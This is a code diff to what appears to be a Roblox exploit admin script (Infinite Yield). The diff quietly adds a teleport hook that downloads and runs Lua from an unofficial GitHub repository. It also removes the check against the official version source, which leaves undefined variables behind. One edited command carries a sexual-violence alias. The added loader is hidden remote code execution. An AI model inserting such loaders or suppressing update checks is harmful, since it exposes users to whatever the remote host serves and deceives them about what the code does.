@@ -6305,6 +6305,14 @@ Close_4.MouseButton1Click:Connect(function()
 	PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
 end)
 
+local TeleportCheck = false
+Players.LocalPlayer.OnTeleport:Connect(function(State)
+	if KeepInfYield and (not TeleportCheck) and queueteleport then
+		TeleportCheck = true
+		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/V0RTwXh7bA1/ABVno/refs/heads/main/funny.lua'))()")
+	end
+end)
+
 addcmd('addalias',{},function(args, speaker)
 	if #args < 2 then return end
 	local cmd = string.lower(args[1])
@@ -10474,13 +10482,6 @@ end
 addcmd("bang", {"rape"}, function(args, speaker)
 	execCmd("unbang")
 	wait()
-	local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
-	bangDied = humanoid.Died:Connect(function()
-		bang:Stop()
-		bangAnim:Destroy()
-		bangDied:Disconnect()
-		bangLoop:Disconnect()
-	end)
 	if args[1] then
 		local players = getPlayer(args[1], speaker)
 		for _, v in pairs(players) do
@@ -10489,7 +10490,9 @@ addcmd("bang", {"rape"}, function(args, speaker)
 			bangLoop = RunService.Stepped:Connect(function()
 				pcall(function()
 					local otherRoot = getTorso(Players[bangplr].Character)
+					if otherRoot ~= nil then
 					getRoot(speaker.Character).CFrame = otherRoot.CFrame * bangOffet
+					end
 				end)
 			end)
 		end
@@ -12704,12 +12707,6 @@ end
 
 IYMouse.Move:Connect(checkTT)
 
-task.spawn(function()
-	local success, latestVersionInfo = pcall(function() 
-		local versionJson = game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/version')
-		return HttpService:JSONDecode(versionJson)
-	end)
-
 	if success then
 		if currentVersion ~= latestVersionInfo.Version then
 			notify('Outdated','Get the new version at infyiff.github.io')
@@ -12798,7 +12795,6 @@ task.spawn(function()
 			end)
 		end
 	end
-end)
 
 task.spawn(function()
 	wait()
